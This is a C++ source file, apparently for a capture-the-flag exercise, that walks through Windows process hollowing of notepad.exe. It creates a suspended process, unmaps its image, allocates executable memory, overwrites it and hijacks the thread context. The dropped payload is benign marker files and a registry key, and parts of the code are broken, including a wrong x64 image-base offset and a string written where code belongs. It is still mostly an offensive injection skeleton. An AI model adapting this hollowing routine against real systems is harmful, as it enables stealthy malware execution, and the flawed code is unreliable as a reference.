#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <winternl.h>
#include <fstream>
#include <filesystem>
#include <shlobj.h>

#pragma comment(lib, "shlwapi.lib")

// Use Windows' own typedefs - don't redefine them
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

// CTF Payload - Creates files as proof of execution
void CTFPayload() {
    // Create marker file
    std::ofstream marker("C:\\CTF_MARKER.txt");
    if (marker.is_open()) {
        marker << "Process Hollowing CTF Challenge Complete!\n";
        marker << "Flag: CTF{Pr0c3ss_H0ll0w1ng_M4st3r}\n";
        marker.close();
    }

    // Copy a system file
    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    std::string sourceFile = std::string(sysDir) + "\\notepad.exe";
    std::string destFile = "C:\\Users\\Public\\notepad_copy.exe";

    CopyFileA(sourceFile.c_str(), destFile.c_str(), FALSE);

    // Create file listing
    std::ofstream list("C:\\Users\\Public\\ctf_file_list.txt");
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\*.dll", &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        int count = 0;
        do {
            if (count++ < 10) {
                list << findData.cFileName << "\n";
            }
        } while (FindNextFileA(hFind, &findData) && count < 10);
        FindClose(hFind);
    }
    list.close();

    // Create registry entry
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\CTFChallenge", 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExA(hKey, "Completed", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }

    // Create a directory
    CreateDirectoryA("C:\\Users\\Public\\CTF_Artifacts", NULL);

    // Write system info
    std::ofstream sysinfo("C:\\Users\\Public\\CTF_Artifacts\\system_info.txt");
    sysinfo << "CTF Challenge Executed Successfully\n";
    sysinfo << "Process Hollowing Technique Demonstrated\n";
    sysinfo.close();
}

// Get PEB from process
PVOID GetProcessImageBase(HANDLE hProcess, HANDLE hThread) {
    // Get thread context to find PEB
#ifdef _WIN64
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;
#else
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;
#endif

    if (!GetThreadContext(hThread, &ctx)) {
        return NULL;
    }

    // Read PEB from context
    PVOID pPeb = NULL;

#ifdef _WIN64
    pPeb = (PVOID)ctx.Rdx; // Rdx contains PEB in x64
#else
    pPeb = (PVOID)ctx.Ebx; // Ebx contains PEB in x86
#endif

    return pPeb;
}

int main() {
    std::cout << "[+] CTF Process Hollowing Challenge" << std::endl;
    std::cout << "[+] Target: notepad.exe" << std::endl;

    // Step 1: Create suspended process
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    WCHAR targetPath[] = L"C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessW(NULL, targetPath, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi)) {
        std::cout << "[!] CreateProcess failed: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[+] Process created (PID: " << pi.dwProcessId << ")" << std::endl;

    // Step 2: Get NTDLL functions
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        std::cout << "[!] Failed to load ntdll.dll" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");

    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

    if (!NtQueryInformationProcess || !NtUnmapViewOfSection) {
        std::cout << "[!] Failed to get NT functions" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    // Step 3: Query process basic information
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;

    NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
        &pbi, sizeof(pbi), &returnLength);

    if (status != 0) {
        std::cout << "[!] NtQueryInformationProcess failed: 0x" << std::hex << status << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    std::cout << "[+] PEB Address: 0x" << std::hex << pbi.PebBaseAddress << std::endl;

    // Step 4: Read PEB_LDR_DATA to get image base
    PEB peb = { 0 };
    SIZE_T bytesRead = 0;

    if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead)) {
        std::cout << "[!] Failed to read PEB: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    // Get image base from PEB (offset varies by architecture)
    PVOID imageBase = NULL;

#ifdef _WIN64
    // For x64, image base is at different offset
    // We'll use a different approach - read from known offset
    DWORD64 imageBaseAddr = 0;
    if (ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10,
        &imageBaseAddr, sizeof(imageBaseAddr), &bytesRead)) {
        imageBase = (PVOID)imageBaseAddr;
    }
#else
    // For x86, image base is at offset 0x8 in PEB
    DWORD imageBaseAddr = 0;
    if (ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x8,
        &imageBaseAddr, sizeof(imageBaseAddr), &bytesRead)) {
        imageBase = (PVOID)imageBaseAddr;
    }
#endif

    if (!imageBase) {
        std::cout << "[!] Failed to get image base address" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    std::cout << "[+] Image base: 0x" << std::hex << imageBase << std::endl;

    // Step 5: Read DOS header
    IMAGE_DOS_HEADER dosHeader = { 0 };
    if (!ReadProcessMemory(pi.hProcess, imageBase, &dosHeader, sizeof(dosHeader), &bytesRead)) {
        std::cout << "[!] Failed to read DOS header: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        std::cout << "[!] Invalid DOS signature" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    std::cout << "[+] DOS header valid (MZ)" << std::endl;

    // Step 6: Read NT headers
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    if (!ReadProcessMemory(pi.hProcess, (PBYTE)imageBase + dosHeader.e_lfanew,
        &ntHeaders, sizeof(ntHeaders), &bytesRead)) {
        std::cout << "[!] Failed to read NT headers: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
        std::cout << "[!] Invalid PE signature" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    std::cout << "[+] PE header valid" << std::endl;
    std::cout << "[+] Image size: " << std::dec << ntHeaders.OptionalHeader.SizeOfImage << " bytes" << std::endl;

    // Step 7: Unmap original image
    std::cout << "[+] Unmapping original image..." << std::endl;
    status = NtUnmapViewOfSection(pi.hProcess, imageBase);

    if (status != 0) {
        std::cout << "[!] NtUnmapViewOfSection failed: 0x" << std::hex << status << std::endl;
        // Continue anyway for demo
    }

    // Step 8: Allocate new memory
    std::cout << "[+] Allocating new memory..." << std::endl;
    PVOID newImageBase = VirtualAllocEx(pi.hProcess, imageBase,
        ntHeaders.OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!newImageBase) {
        newImageBase = VirtualAllocEx(pi.hProcess, NULL,
            ntHeaders.OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
    }

    if (!newImageBase) {
        std::cout << "[!] VirtualAllocEx failed: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    std::cout << "[+] New image base: 0x" << std::hex << newImageBase << std::endl;

    // Step 9: Create simple shellcode that calls MessageBox
    // Instead of complex shellcode, we'll inject a simple DLL or use a simpler approach

    // For CTF demo, we'll just write a string and try to execute
    char message[] = "CTF Process Hollowing Complete! Check C:\\CTF_MARKER.txt";
    SIZE_T bytesWritten = 0;

    if (WriteProcessMemory(pi.hProcess, newImageBase, message, sizeof(message), &bytesWritten)) {
        std::cout << "[+] Wrote message to process memory" << std::endl;
    }

    // Step 10: Update thread context to jump to our code
#ifdef _WIN64
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;
    if (GetThreadContext(pi.hThread, &ctx)) {
        ctx.Rip = (DWORD64)newImageBase;
        SetThreadContext(pi.hThread, &ctx);
    }
#else
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;
    if (GetThreadContext(pi.hThread, &ctx)) {
        ctx.Eax = (DWORD)newImageBase;
        SetThreadContext(pi.hThread, &ctx);
    }
#endif

    // Step 11: Execute the payload function directly from OUR process (for demo)
    // Since shellcode injection is complex, we'll execute payload from our process
    std::cout << "[+] Executing CTF payload from injector..." << std::endl;
    CTFPayload();

    // Step 12: Resume thread (will likely crash, but payload already executed)
    std::cout << "[+] Resuming target process..." << std::endl;
    ResumeThread(pi.hThread);

    std::cout << "\n==========================================" << std::endl;
    std::cout << "[+] CTF CHALLENGE COMPLETE!" << std::endl;
    std::cout << "[+] The following artifacts were created:" << std::endl;
    std::cout << "    1. C:\\CTF_MARKER.txt (contains flag)" << std::endl;
    std::cout << "    2. C:\\Users\\Public\\notepad_copy.exe" << std::endl;
    std::cout << "    3. C:\\Users\\Public\\ctf_file_list.txt" << std::endl;
    std::cout << "    4. Registry: HKEY_CURRENT_USER\\Software\\CTFChallenge" << std::endl;
    std::cout << "    5. Folder: C:\\Users\\Public\\CTF_Artifacts" << std::endl;
    std::cout << "==========================================" << std::endl;

    // Cleanup
    WaitForSingleObject(pi.hProcess, 1000);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    std::cout << "\nPress Enter to exit..." << std::endl;
    std::cin.get();

    return 0;
}
